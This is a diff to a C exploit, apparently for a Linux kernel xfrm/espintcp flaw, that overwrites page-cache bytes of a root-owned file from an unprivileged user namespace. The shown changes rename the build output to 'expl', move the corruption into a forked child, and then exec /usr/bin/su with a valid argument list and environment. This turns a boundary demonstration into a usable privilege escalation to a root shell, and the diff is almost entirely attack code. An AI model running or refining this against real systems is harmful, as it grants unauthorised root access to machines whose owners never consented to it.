@@ -17,10 +17,10 @@
  * to demonstrate the permission boundary.
  *
  * Build:
- *   gcc -O2 -Wall -Wextra -static xfrm_espintcp_pagecache_replace.c -o xfrm_espintcp_pagecache_replace
+ *   gcc -O2 -Wall -Wextra -static fragnesia.c -o expl
  *
  * Run:
- *   ./xfrm_espintcp_pagecache_replace /tmp/root-owned-copy 0 42434445
+ *   ./expl /tmp/root-owned-copy 0 42434445
  *
  * Exit codes:
  *   1: vulnerable behavior verified
@@ -1266,6 +1266,12 @@ int main(int argc, char **argv)
 	size_t desired_len, sample_len;
 	int ret;
 
+	pid_t pid;
+	char *su_argv[] = {"su", NULL};
+	char *su_envp[] = {"TERM=xterm", "PATH=/bin:/usr/bin:/sbin:/usr/sbin", NULL};
+
+	(void)argc;
+	(void)argv;
 
 	setvbuf(stdout, NULL, _IONBF, 0);
 
@@ -1288,15 +1294,27 @@ int main(int argc, char **argv)
 
 	printf(C_BCYN "[*]" C_RESET " target=%s size=%llu\n",
 	       target_file, (unsigned long long)file_size);
-	verify_write_denied("outer");
-	setup_user_netns_xfrm();
-	verify_write_denied("userns_root_mapped_to_outer_user");
 
-	ret = replace_existing_bytes_after(byte_off, desired, desired_len,
-					   file_size);
+	pid = fork();
+	if (pid < 0) {
+		perror("fork");
+		return 1;
+	}
+	if (pid == 0) {
+		verify_write_denied("outer");
+		setup_user_netns_xfrm();
+		verify_write_denied("userns_root_mapped_to_outer_user");
+
+		ret = replace_existing_bytes_after(byte_off, desired, desired_len,
+						   file_size);
+		exit(ret);
+	}
+	waitpid(pid, &ret, 0);
+
 	/* reset scroll region; some terminals home the cursor on \033[r so
 	 * explicitly jump to the last row so PS1 lands below our output */
 	write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19);
-	execve("/usr/bin/su", NULL, NULL);
-	return ret;
+	execve("/usr/bin/su", su_argv, su_envp);
+
+	return WIFEXITED(ret) ? WEXITSTATUS(ret) : 1;
 }
